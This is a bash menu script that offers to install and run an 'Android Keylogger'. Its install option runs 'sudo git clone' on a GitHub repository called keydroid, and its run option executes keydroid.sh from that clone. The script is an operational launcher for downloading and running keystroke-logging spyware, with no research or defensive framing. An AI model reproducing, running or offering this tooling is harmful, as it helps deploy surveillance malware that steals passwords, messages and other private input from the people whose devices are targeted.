#!/bin/bash

# Function to handle installation
install_android_keylogger() {
    echo "Installing Android Keylogger.."
    sudo git clone https://github.com/F4dl0/keydroid.git
    echo "Android Keylogger installed successfully!"
}

# Function to run Android Keylogger
run_android_keylogger() {
    echo "Running Android Keylogger.."
    cd keydroid || { echo "Error: Android Keylogger directory not found. Install Android Keylogger first."; return; }
    bash keydroid.sh
}

# Main menu
while true; do
    echo "Android Keylogger Script"
    echo "----------------"
    echo "1. Install Android Keylogger"
    echo "2. Run Android Keylogger"
    echo "3. Exit"
    echo "----------------"
    
    read -rp "Enter your choice: " choice

    case $choice in
        1) install_android_keylogger;;
        2) run_android_keylogger ;;
        3) exit ;;
        *) echo "Invalid choice. Please select again." ;;
    esac
done
